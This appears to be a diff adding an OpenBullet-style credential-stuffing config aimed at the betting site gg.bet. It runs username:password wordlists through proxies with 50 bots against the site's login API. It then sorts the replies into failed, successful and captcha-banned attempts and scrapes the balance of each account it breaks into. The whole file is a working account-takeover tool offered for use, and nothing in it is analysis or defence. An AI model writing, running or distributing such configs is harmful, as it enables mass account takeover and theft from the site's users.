@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "BET.GG",
+  "SuggestedBots": 50,
+  "LastModified": "2018-12-22T15:49:23.7824968+00:00",
+  "AdditionalInfo": "",
+  "Author": "Garfield - A BAD CAT",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOG_THE_FUCK_IN REQUEST POST "https://gg.bet/api/auth/login" AutoRedirect=TRUE 
+  CONTENT "_username=<USER>&_password=<PASS>&_target_path=%2Fen%2Fbetting" 
+  CONTENTTYPE " application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://gg.bet" 
+  HEADER "referer: https://gg.bet/en/betting" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Gc-Location: " 
+  HEADER "Cache-Control: private, must-revalidate" 
+  HEADER "pragma: no-cache" 
+  HEADER "expires: -1" 
+  HEADER "Origin-Hostname: php-aspso70p52wnjo48jz.ggbet.us" 
+  HEADER "Expect-CT: max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"" 
+  HEADER "Server: cloudflare" 
+  HEADER "CF-RAY: 48d3a58f9fd3bcb6" 
+#WHAT_THE_HELL? KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Wrong credentials" 
+    KEY "Login does not exist" 
+  KEYCHAIN Success OR 
+    KEY "success" 
+  KEYCHAIN Ban OR 
+    KEY "Invalid captcha" 
+#WHERE_AM_I? REQUEST GET "https://gg.bet/en/betting" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#WHAT_THE_FUCK? KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "<SOURCE>" EqualTo "0.00" 
+#DONE PARSE "<SOURCE>" LR " <span data-balance=\"total\">" "</span>" Recursive=FALSE -> CAP "Balance" "" "" 
